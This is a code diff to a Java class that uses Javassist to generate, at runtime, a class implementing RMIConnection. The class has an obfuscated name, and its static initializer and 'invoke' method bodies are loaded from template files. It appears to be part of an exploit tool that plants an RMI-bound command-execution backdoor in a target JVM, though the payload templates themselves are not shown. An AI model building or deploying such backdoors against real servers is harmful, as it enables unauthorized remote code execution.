@@ -9,7 +9,7 @@ import static com.Main.basePath;
 
 public class RmiBind {
 
-    public static ClassDto bind(int port) throws Exception {
+    public static ClassDto bind(String rmiExObjPort) throws Exception {
         ClassPool classPool = new ClassPool();
         classPool.insertClassPath(basePath + "/jdk/*");
 
@@ -17,33 +17,32 @@ public class RmiBind {
         String readableClassName = Utils.getReadableClassName("");
         String className = readablePackageName + readableClassName;
         CtClass rmiBindEchoRegisterCtClass = classPool.makeClass(className);
-        CtClass unicastRemoteObjectCtClass = classPool.get("java.rmi.server.UnicastRemoteObject");
+        CtClass rmiConnectionCtClass = classPool.get("javax.management.remote.rmi.RMIConnection");
 
-        rmiBindEchoRegisterCtClass.setSuperclass(unicastRemoteObjectCtClass);
-
-        rmiBindEchoRegisterCtClass.addField(CtField.make("private static boolean FLAG=false;", rmiBindEchoRegisterCtClass));
+        rmiBindEchoRegisterCtClass.setInterfaces(new CtClass[]{rmiConnectionCtClass});
 
         CtConstructor rmiBindEchoRegisterCtConstructor = rmiBindEchoRegisterCtClass.makeClassInitializer();
         String staticBody = Utils.loadTempFile("/RmiBindEchoRegister.temp");
-        staticBody = staticBody.replace("{{{port}}}", Integer.toString(port));
         staticBody = staticBody.replace("{{{className}}}", className);
+        staticBody = staticBody.replace("{{{rmiExObjPort}}}", rmiExObjPort);
 
         rmiBindEchoRegisterCtConstructor.setBody(staticBody);
 
-        String methodName = Utils.getReadableMethodName("");
-        ArrayList<String> readableFiledName = Utils.getReadableFiledName(2);
-        String executerMethodDescirpt = "public String " + methodName + "(String " + readableFiledName.get(0) + ", String " + readableFiledName.get(1) + ") throws java.rmi.RemoteException;";
-
-        //method
-        String executerMethodBody = Utils.loadTempFile("/RmiBindEchoExecute.temp");
         //generate method
+        String executerMethodDescirpt = "public Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject) throws javax.management.InstanceNotFoundException,javax.management.MBeanException,javax.management.ReflectionException,java.io.IOException;";
+        String executerMethodBody = Utils.loadTempFile("/RmiBindEchoExecute.temp");
         CtMethod executerMethodCtMethod = CtMethod.make(executerMethodDescirpt, rmiBindEchoRegisterCtClass);
         rmiBindEchoRegisterCtClass.addMethod(executerMethodCtMethod);
         executerMethodCtMethod.setBody(executerMethodBody);
-        //setBody will modify ctClass to abstract
-        //modify to non-abstract
-        rmiBindEchoRegisterCtClass.setModifiers(rmiBindEchoRegisterCtClass.getModifiers() & ~Modifier.ABSTRACT);
 
-        return new ClassDto(className, methodName, rmiBindEchoRegisterCtClass.toBytecode());
+        //add construct
+        CtConstructor constructor = CtNewConstructor.make("public " + readableClassName + "() throws java.rmi.RemoteException{}", rmiBindEchoRegisterCtClass);
+        constructor.setBody("{}");
+        rmiBindEchoRegisterCtClass.addConstructor(constructor);
+
+        rmiBindEchoRegisterCtClass.setModifiers(rmiBindEchoRegisterCtClass.getModifiers() & ~Modifier.ABSTRACT);
+        rmiBindEchoRegisterCtConstructor.getMethodInfo().rebuildStackMap(classPool);
+
+        return new ClassDto(className, "invoke", rmiBindEchoRegisterCtClass.toBytecode());
     }
 }
